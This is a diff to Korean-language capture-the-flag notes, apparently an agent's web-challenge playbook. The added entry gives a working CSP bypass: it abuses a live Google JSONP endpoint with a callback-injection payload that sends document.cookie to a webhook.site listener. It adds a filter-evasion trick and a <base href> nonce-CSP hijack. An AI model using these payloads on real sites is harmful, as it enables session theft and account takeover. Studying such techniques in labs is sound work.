@@ -181,11 +181,15 @@ await fetch('/challenge/web-01/', {credentials:'include'}).then(r=>r.text())
   405=`TRACE /`(TraceEnable off); 408=미완성 요청(`/dev/tcp`로 부분 헤더 전송 후 >20s 대기, mod_reqtimeout 발화 — curl로는
   안 되고 raw 소켓 필요); 412=`If-Match: "x"` + POST; 414=초장문 URI(수천 자); 416=만족불가 `Range:`(파일 크기 초과 시작);
   417=`Expect: 100-xyz`. (431 과대헤더는 Apache가 400으로 접어 400과 충돌하니 주의.)
-- **CSP `script-src https://*.google.com/` 우회(admin-bot XSS)**: 반사 XSS인데 CSP가 구글 서브도메인 스크립트만 허용하면
-  *.google.com의 JSONP/오픈콜백 가젯으로 임의 JS를 실행한다. `default-src`가 없으면 img/connect는 자유이므로
-  `new Image().src='//<리스너>/?c='+document.cookie`로 admin 쿠키(=플래그) 반출. 리스너는 위 "공인 인바운드를 계정·
-  설치 없이 확보" (1)의 `webhook.site`면 충분(받기만 하면 됨). 단 *.google.com의 쓸만한 JSONP 가젯은 상당수 폐기돼
-  스크립트 실행 자체가 막힐 수 있다 — 그게 1차 난관(인프라가 아니라 가젯 가용성).
+- **CSP `script-src https://*.google.com/` 우회(admin-bot XSS) — 실해결**: 반사 XSS인데 CSP가 구글 서브도메인 스크립트만
+  허용하면 *.google.com의 JSONP 가젯으로 임의 JS를 실행한다. **아직 살아있는 가젯(2026-10 실측)**:
+  `https://www.google.com/complete/search?client=chrome&q=a&jsonp=<CB>` → `text/javascript`로 `<CB>([...])`를 반환
+  (`www.google.com`이 와일드카드에 매칭). 구형 `accounts.google.com/o/oauth2/revoke?callback=`은 **폐기됨(400)**.
+  **콜백 주입 트릭**: jsonp 값에 `fetch(\`//<리스너>/c?k=${document.cookie}\`)//`를 넣으면 응답이
+  `fetch(\`...${document.cookie}\`)//([...])`가 되어 `//`가 뒤의 JSONP 호출을 주석처리 → 내 fetch만 CHILD origin에서 실행.
+  `default-src`가 없으면 fetch/img는 어디로든 자유. 리스너는 받기만 하면 되니 `webhook.site`로 충분. **따옴표·공백·`%`·
+  `&`·`<`가 필터링돼도** 백틱 템플릿 리터럴로 따옴표·공백 없이 반출 가능(CHILD :10014 실해결, admin 쿠키 수신).
+  → 인프라도 가젯도 막혔다고 섣불리 판정 말 것. complete/search를 먼저 시험한다.
 - **nonce 전용 CSP 우회 = `<base href>` 하이재킹**: CSP가 `script-src 'nonce-<매요청 난수>'`뿐이고 주입점이 합법
   `<script src=/script.js nonce=VALID>` **앞**에 있으면, nonce는 매번 바뀌어 위조 불가하지만 `<base href=//<attacker>/>`를
   주입하면 `/script.js`가 attacker 호스트로 해석되어 로드된다 — **nonce는 태그를 검증할 뿐 출처(origin)는 검증 안 하므로**
